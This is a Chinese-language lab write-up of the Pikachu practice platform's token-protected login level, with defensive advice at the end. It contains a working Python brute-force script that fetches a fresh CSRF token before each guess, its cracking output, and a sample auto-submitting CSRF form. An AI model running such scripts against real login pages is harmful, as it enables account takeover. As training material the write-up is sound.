---
layout: post
title: Pikachu - 暴力破解 token防爆破 Writeup
platform: pikachu
date: 2026-10-25 20:07:00 +0800
categories: CTF
---

Pikachu - 暴力破解 token防爆破 Writeup

一、题目信息

- 平台：Pikachu 漏洞练习平台（本地搭建）
- 模块：暴力破解 → token 防爆破？
- 地址：`http://localhost/pikachu/vul/burteforce/bf_token.php`
- 题型：Web
- 考点：**token 的真实用途（防 CSRF）**、**带状态的自动化爆破**

**环境信息**：

```text
phpStudy 8.1.1.3（D:\phpstudy_pro）
Apache 2.4.39 + MySQL 5.7.26 + PHP 7.3.4
pikachu 源码放在 D:\phpstudy_pro\WWW\pikachu\
```

**✅ 实测结果**

```text
★ 页面结构：没有验证码，只有用户名 / 密码 / Login

    ┌──────────────────────────┐
    │ Please Enter Your Info   │
    │  [ Username          ]   │
    │  [ Password          ]   │
    │  [ Login ]               │
    │                          │
    │  （token 藏在 HTML 里，页面上看不见）│
    └──────────────────────────┘

★ token 机制实测（三次请求）：

    ① GET 页面 → 抓到 token = 682016addedd1e077d239700407
    ② 用 token1 提交（正确密码）  → login success        ✅
    ③ 再用 token1 提交（同一个）  → csrf token error      ❌
    ④ 重新 GET → 新 token = 751216addedd20af84136291193
    ⑤ 用 token2 提交             → login success        ✅

    ★ 结论：这关的 token 是【正确实现】的，一个只能用一次

★ 爆破结果（每个密码发 2 个请求）：

    目标用户 pikachu
    [  1/145]  123456     失败
    ...
    [ 31/145]  000000     ★★★ 成功

    尝试 31 次密码
    实际请求数 约 62 个
    耗时 1.9 秒
```

二、题目分析

**① 页面上的 token 在哪（页面上看不见）**

```html
<!-- bf_token.php 第 115 行 -->
<input type="hidden" name="token" value="<?php echo $_SESSION['token'];?>" />
```

**渲染后的 HTML**：

```html
<input type="hidden" name="token" value="682016addedd1e077d239700407" />
         └───┬───┘
      hidden = 页面上不显示，但提交时会带上
```

**★ 三种找到它的方法**：

```text
① F12 → 元素 → 点面板内部 → Ctrl+F → 搜 "token"
② F12 → 网络 → 提交一次 → 【负载】里看 token 字段（最直观）
③ 页面按 Ctrl+U 看源代码 → Ctrl+F 搜 "token"
```

**② 后端代码**

```php
<?php
// bf_token.php 第 24-63 行
if(isset($_POST['submit']) && $_POST['username'] && $_POST['password'] && $_POST['token']){

    $username = $_POST['username'];
    $password = $_POST['password'];
    $token    = $_POST['token'];

    $sql = "select * from users where username=? and password=md5(?)";
    $line_pre = $link->prepare($sql);
    $line_pre->bind_param('ss', $username, $password);

    if($token == $_SESSION['token']){          // ★ 校验 token

        if($line_pre->execute()){
            $line_pre->store_result();
            if($line_pre->num_rows > 0){
                $html .= '<p> login success</p>';
            } else {
                $html .= '<p> username or password is not exists～</p>';
            }
        }

    } else {
        $html .= '<p> csrf token error</p>';    // ★ token 不对就拒绝
    }
}

// ★★★ 每次请求结束都重新生成 token
set_token();
?>
```

**③ token 是怎么生成的**

```php
// inc/function.php 第 69 行
function set_token(){
    if(isset($_SESSION['token'])){
       unset($_SESSION['token']);          // ★ 先销毁旧的
    }
    $_SESSION['token'] = str_replace('.', '', uniqid(mt_rand(10000, 99999), true));
}
```

**逐层拆解**：

```php
uniqid(mt_rand(10000, 99999), true)
    │      └──────┬──────┘    └─┬─┘
    │        5 位随机前缀     带小数（更精确）
    │
    └── 基于微秒时间生成唯一字符串
        例： "682016addedd1e.077d239700407"

str_replace('.', '', ...)
    → 去掉小数点
    → "682016addedd1e077d239700407"
       └──────────┬──────────────┘
             这就是 token
```

**★ token 的特点**：

```text
· 随机生成（不可预测）
· 每次请求后都换新的
· 用一次就作废
```

**④ 所以这关的 token 是"对的"**

**对比第 3 关的验证码**：

| | 第 3 关（验证码）| 第 4 关（token）|
|---|---|---|
| 是否校验 | ✅ 校验了 | ✅ 校验了 |
| 是否销毁 | ❌ **没销毁** | ✅ **销毁了** |
| 是否能复用 | ✅ 能（漏洞）| ❌ 不能（正确）|
| 是否泄露 | ✅ 泄露在 Cookie | ⚠️ 在 HTML 里（但这是必要的）|

**★ 这关的 token 实现是**正确**的 —— 比第 3 关规范多了。**

**⑤ 那为什么还能爆破**

**因为"每个 token 只能用一次"只意味着**：

```text
你不能"抓一次 token 用到底"
你必须"每次都重新领一张票"

★ 领票的动作 = 一个 GET 请求
★ 成本 = 多一次请求
```

**攻击流程**：

```
一次密码尝试 = 2 个请求
    ┌─────────────────────────────────────┐
    │ ① GET  /bf_token.php                │
    │    → HTML 里带 token=682016...      │
    │                                     │
    │ ② POST /bf_token.php                │
    │    username=pikachu                 │
    │    password=试的密码                  │
    │    token=682016...                  │
    │    → 服务器校验 token 通过 → 查密码   │
    │                                     │
    │ （token 作废，下一个密码重新领）       │
    └─────────────────────────────────────┘
```

**实测数据**：

```text
31 次密码 × 2 = 62 个请求
耗时 1.9 秒
平均每个密码 62 毫秒

★ 对比第 1 关（31 请求 / 0.1 秒）
  速度只慢了不到 20 倍，绝对值仍然"瞬间"
```

**⑥ 作者自己的注释**

```html
<a href="#" data-content="token了解下,后面搞CSRF会用到....虽然这里并没有什么鸟用.">
    点一下提示~
</a>
```

**翻译**：

> "token 了解一下，后面讲 CSRF 会用到……
>  虽然拿它来防暴力破解并没有什么鸟用。"

**★ 出题人直接告诉你了：token 不是用来防爆破的。**

三、解题步骤

**第 1 步：看到 token 在哪**

```text
① 打开 http://localhost/pikachu/vul/burteforce/bf_token.php
② F12 → 【元素】标签 → 点一下面板内部 → Ctrl+F → 输入 token
③ 会跳到：
   <input type="hidden" name="token" value="682016addedd1e077d239700407" />
```

**或者更直观**：

```text
① F12 → 【网络】
② 页面上填 admin / 123456 → 点 Login
③ 点那条 bf_token.php 的 POST
④ 【负载】标签：

    username: admin
    password: 123456
    token:    682016addedd1e077d239700407    ← ★ 它在这
    submit:   Login
```

**第 2 步：验证 token 是一次性的**

```text
① 记住当前 token（比如 682016...）
② 提交一次（admin / 123456）→ login success
③ 按 F5 刷新页面
④ 再看 HTML 里的 token → 变成 751216...（变了）

或者用"编辑并重发"测：
① 抓到 POST 请求
② 右键 → 编辑并重发
③ 不改任何东西，直接再发一次
④ 响应 → "csrf token error"

★ 证明：token 用一次就作废
```

**第 3 步：爆破策略 —— 两步循环**

**核心思路**：

```python
for 密码 in 字典:
    token = GET页面并提取()      # ① 领票
    POST(用户名, 密码, token)    # ② 凭票进场
```

**完整脚本**：

```python
import re
import ssl
import time
import urllib.request
import urllib.parse
import http.cookiejar

CTX = ssl.create_default_context()
CTX.check_hostname = False
CTX.verify_mode = ssl.CERT_NONE

URL = "http://localhost/pikachu/vul/burteforce/bf_token.php"
DICT = r"C:\Users\cecilia\Downloads\passwords-top150.txt"

# 建一个"假浏览器"，全程复用同一个 session
jar = http.cookiejar.LWPCookieJar()
opener = urllib.request.build_opener(
    urllib.request.HTTPCookieProcessor(jar),
    urllib.request.HTTPSHandler(context=CTX),
)


def fetch_token():
    """① GET 页面，从 hidden input 里抓出当前 token"""
    req = urllib.request.Request(URL, headers={"User-Agent": "Mozilla/5.0"})
    with opener.open(req, timeout=15) as r:
        html = r.read().decode("utf-8", "replace")
    m = re.search(r'name="token"\s+value="([^"]+)"', html)
    return m.group(1) if m else None


def try_login(username, password):
    """② 先领 token，再提交"""
    token = fetch_token()
    if not token:
        return "NO_TOKEN"

    data = urllib.parse.urlencode({
        "username": username,
        "password": password,
        "token": token,          # ★ 每次都是新的
        "submit": "Login",
    }).encode()
    req = urllib.request.Request(URL, data=data, method="POST", headers={
        "User-Agent": "Mozilla/5.0",
        "Content-Type": "application/x-www-form-urlencoded",
    })
    with opener.open(req, timeout=15) as r:
        body = r.read().decode("utf-8", "replace")

    if "login success" in body:
        return "OK"
    if "csrf token error" in body:
        return "TOKEN_ERROR"
    return "PWD_ERROR"


# 主循环
with open(DICT, encoding="utf-8") as f:
    passwords = [line.strip() for line in f if line.strip()]

start = time.time()
for i, pw in enumerate(passwords, 1):
    r = try_login("pikachu", pw)
    if r == "OK":
        print("[%3d/%3d]  %-22s ★★★ 成功  耗时 %.1f 秒"
              % (i, len(passwords), pw, time.time() - start))
        break
    print("[%3d/%3d]  %-22s 失败" % (i, len(passwords), pw))
```

**实测输出**：

```text
==================================================================
 pikachu 第 4 关：token 防爆破
 目标用户: pikachu
 策略：每试一个密码，先 GET 领新 token，再 POST
       → 请求数 x2，但依然能跑
==================================================================

[  1/145]  123456                 失败
[  2/145]  password               失败
...
[ 31/145]  000000                 ★★★ 成功

==================================================================
✅ 爆破成功
   用户名: pikachu
   密  码: 000000
   尝试: 31 次密码
   实际请求数: 约 62 个（每个密码 2 个请求）
   耗时: 1.9 秒
   平均每个密码: 62 毫秒
==================================================================
```

**★ 整个脚本和前三关的差别只有 2 行**：

```python
token = fetch_token()                    # 多这一行
data = {..., "token": token, ...}        # 多这个字段
```

**第 4 步：为什么 Burp 做这关比较麻烦**

**Burp Intruder 默认是"同一个请求模板重复发"** —— 但这里每个请求的 token 都不同。

**三种办法**：

```text
① 用 Burp 的 Session Handling Rules（专业版功能）
   → Community 版可能受限

② 用插件（比如 "Hackvertor" 配合宏）
   → 配置复杂

③ 手动逐条改
   → 145 个密码 = 不可能
```

**★ 所以这关**脚本**反而是更合适的工具** —— 这也是个重要认知**：

```text
工具没有好坏，看场景
    · 简单重复请求 → Burp Intruder 最方便
    · 需要"先取后发"的流程 → 脚本更合适
```

四、延伸知识

**① token 到底是什么**

**一句话**：

```text
token = 一小段"一次性凭证"
        服务器发的 → 你拿着 → 办事时出示 → 用完作废
```

**生活类比**：

```text
银行取号牌 A023   → 叫号时凭它办事
游乐园门票        → 撕角后作废
快递取件码        → 只有你和系统知道
```

**Web 里的各种 token**：

| 名字 | 证明什么 | 例子 |
|---|---|---|
| **Session ID**（PHPSESSID）| **你是谁**（身份）| pikachu 每页都有 |
| **CSRF token** | **这个请求是你主动发的**（意图）| 本关 |
| 验证码 | 你是人 | 第 2、3 关 |
| Access Token（OAuth）| 你已授权 | 微信登录第三方 |
| JWT | 自包含的身份证 | 现代 API |
| API Key | 你是合法调用方 | 开放平台 |

**② ⭐ 核心：Session 和 CSRF token 的分工**

```text
┌──────────────┬────────────────────────────────────────┐
│  Session     │ 证明【你是谁】—— 身份认证               │
│  PHPSESSID   │ 像"身份证"                             │
├──────────────┼────────────────────────────────────────┤
│  CSRF token  │ 证明【这个请求是你主动发的】—— 意图认证  │
│              │ 像"当面签字"                           │
└──────────────┴────────────────────────────────────────┘
```

**为什么两个都需要？看 CSRF 攻击**：

```text
场景：你登录了银行网站（有 session cookie）

① 攻击者给你发一个链接："看这个好玩的图片"
② 你点开 → 访问了攻击者的页面
③ 攻击者的页面里有隐藏表单，自动提交到银行：
       <form action="https://bank.com/transfer" method="POST">
           <input name="to" value="攻击者账号">
           <input name="amount" value="10000">
       </form>
       <script>document.forms[0].submit()</script>
④ 你的浏览器自动带上 bank.com 的 cookie
⑤ 银行看到"有身份证" → 以为是你要转账 → 转了 ❌

★ 这就是 CSRF（跨站请求伪造）
```

**加上 CSRF token 之后**：

```text
③ 攻击者的页面提交请求时
   → 请求里没有正确的 token（他看不到你页面里的 token）
   → 银行看到 token 不对 → 拒绝 ✅
```

**★ 这就是 token 的真正用途。**

**③ 为什么 token 防 CSRF 有效，但防爆破无效**

```text
CSRF 攻击者的处境：
    · 他在【别的网站】上
    · 他无法读取 bank.com 的页面内容（同源策略）
    · 所以拿不到 token
    → token 有效 ✅

爆破攻击者的处境：
    · 他【直接访问】bf_token.php
    · 他能随意 GET 页面、读取 HTML
    · 每次都能拿到新 token
    → token 无效 ❌
```

**★ 一句话**：

```text
token 防的是"隔着网站伪造请求"
不防"直接打开页面自己操作"
```

**④ 四关的完整对比（暴力破解模块总结）**

| | 第 1 关 | 第 2 关 | 第 3 关 | 第 4 关 |
|---|---|---|---|---|
| **文件** | `bf_form.php` | `bf_client.php` | `bf_server.php` | `bf_token.php` |
| **防护** | 无 | 前端 JS 验证码 | 后端验证码 | token |
| **服务器检查什么** | 密码 | 密码 | 密码 + vcode | 密码 + token |
| **防护正确吗** | — | ❌ 前端 = 没有 | ⚠️ 有但没销毁 | ✅ 正确 |
| **绕过方式** | 直接跑字典 | 直接发请求 | 复用验证码 | 每次领新票 |
| **每密码请求数** | 1 | 1 | 1 | 2 |
| **31 次耗时** | 0.1 秒 | 1.0 秒 | 0.9 秒 | 1.9 秒 |
| **难度** | ⭐ | ⭐ | ⭐⭐ | ⭐⭐⭐ |

**★ 四关的核心结论**：

```text
"没有防护" / "前端防护" / "做了一半的后端防护"
    → 攻击成本几乎一样（都是 1 秒内）

"正确实现的一次性凭证"（第 4 关）
    → 让成本翻倍（1 秒 → 2 秒）

★ 翻倍 ≠ 防住
```

**⑤ 什么才能真正防住暴力破解**

| 防护手段 | 有效性 | 说明 |
|---|---|---|
| 验证码（前端）| ❌ | 等于没有 |
| 验证码（后端）| ⚠️ | 需配"一次性 + 不泄露"才勉强有效 |
| token | ⚠️ | 只翻倍，不阻止 |
| **失败次数限制** | ✅✅ | **最有效**：失败 5 次锁定 |
| **账号锁定** | ✅✅ | 有效（但可能被用来 DoS 别人）|
| **延时（sleep 1s）** | ✅ | 有效（配合并发可绕）|
| **IP 限流** | ✅ | 有效（换代理可绕）|
| **两步验证** | ✅✅✅ | 最强 |

**★ 核心结论**：

```text
验证码 / token 这类"每次请求加点东西"的防护
    → 只提高【单次请求成本】
    → 攻击者可以自动化，成本趋近于 0

真正的防护必须限制【总尝试次数】
    → 失败 5 次锁定
    → 单 IP 每分钟 10 次
    → 异常行为告警
```

**⑥ 正确实现 CSRF token 的要点**

```php
// ① 随机生成（不可预测）
$_SESSION['token'] = bin2hex(random_bytes(32));

// ② 嵌入表单
<input type="hidden" name="token" value="<?= htmlspecialchars($_SESSION['token']) ?>">

// ③ 校验（用 hash_equals 防时序攻击）
if (!hash_equals($_SESSION['token'], $_POST['token'] ?? '')) {
    die("CSRF token invalid");
}

// ④ 用完销毁（防重放）
unset($_SESSION['token']);

// ⑤ 或者用 SameSite Cookie（现代方案）
setcookie('PHPSESSID', $sid, [
    'httponly' => true,
    'samesite' => 'Strict',     // ★ 浏览器层面阻止跨站请求带 cookie
]);
```

**★ `SameSite=Strict` 是现代防 CSRF 的主流方案** ——
**比 token 更省事，浏览器层面就拦住了。**

**⑦ "带状态的自动化"是一个通用技能**

**本关学到的模式**：

```text
先取一个动态值 → 再发请求 → 重复
```

**真实世界里到处都是**：

| 场景 | 需要先取/算什么 |
|---|---|
| CSRF token 保护的接口 | 从页面取 token |
| 短信验证码登录 | 先请求验证码 |
| API 签名 | `sign = md5(params + secret)` |
| OAuth 流程 | 先取 code，再换 access_token |
| 时间戳防重放 | `timestamp = 当前时间` + 签名 |
| 滑动验证 | 算轨迹参数 |
| 签名 URL | 按规则拼加密串 |

**★ 遇到这类防护，思路永远是**：

```text
① 找到"这个值是怎么来的"（页面里？算出来的？接口返回的？）
② 在脚本里复现"获取/计算"的过程
③ 然后正常发请求
```

**⑧ 判断特征要精确（本题踩的坑）**

**调试时遇到的误判**：

```python
# ❌ 错误
if "token" in body:        # 页面里到处都有 token 这个词
    print("token 错误")
```

**正确的判断**：

```python
✅ if "csrf token error" in body     # 只在 token 错时出现
✅ if "login success" in body        # 只在成功时出现
❌ if "token" in body                # 页面上到处都是
```

**★ 通用原则**：

```text
判断特征必须"只在特定情况出现"，不能误命中

做法：
    ① 抓一次成功响应，看它独有的文案
    ② 抓一次失败响应，看它独有的文案
    ③ 选一个只在一边出现的
```

五、总结

- **本题核心：token 是正确实现的（一次性），但它防的是 CSRF，不是暴力破解。**

- **三个实测数据**：

```text
① token 用一次就废：
   第 1 次提交（token1）→ login success
   第 2 次提交（token1）→ csrf token error

② 刷新会换新 token：
   682016addedd1e077d239700407 → 751216addedd20af84136291193

③ 但爆破依然能跑：
   31 次密码 / 62 个请求 / 1.9 秒 → 破出 000000
```

- **一句话解释为什么防不住**：

```text
token 防 CSRF：攻击者在别的网站 → 拿不到你的 token ✅
token 防爆破：攻击者直接访问页面 → 每次都能领新票 ❌
```

- **三个必记要点**：

```text
① token = 一次性凭证，证明"请求的意图"
   Session = 身份，证明"你是谁"
② 遇到"每次要带动态值"的防护 → 变成"两步循环"：
   先取/算 → 再发
③ 验证码和 token 都只提高"单次成本"，
   真正防爆破的是"总次数限制"（锁定/限流）
```

- **实测结果**：

```text
pikachu / 000000
31 次密码，62 个请求，1.9 秒
```


- **四关的核心收获**：

```text
┌────────────────────────────────────────────────────────┐
│  四关的"爆破"本身完全一样                                │
│  差别只在"请求怎么构造"                                  │
│                                                        │
│  第 1 关：1 步循环（直接发）                             │
│  第 2 关：1 步循环（障碍是假的）                          │
│  第 3 关：1 步循环（票能重复用）                          │
│  第 4 关：2 步循环（每次重新领票）                        │
│                                                        │
│  ★ 攻击成本从 0.1 秒涨到 1.9 秒                          │
│  ★ 涨了 19 倍，但绝对值仍然"瞬间"                         │
│  ★ 这才是"暴力破解为什么难防"的本质                       │
└────────────────────────────────────────────────────────┘
```

**手工复现要点**：

```text
· 找 token：F12 → 元素 → Ctrl+F 搜 "token"
        或 F12 → 网络 → 提交 → 负载里看
· 验证一次性：编辑并重发，不改内容直接再发 → csrf token error
· 验证会变：刷新页面 → token 不一样
· 爆破：每个密码先 GET 拿 token，再 POST
```

**下一步建议**：

```text
token 的真正用途是防 CSRF
→ pikachu 的【CSRF】模块会把它讲透
→ 建议暴力破解模块打完，直接进 CSRF 模块
```
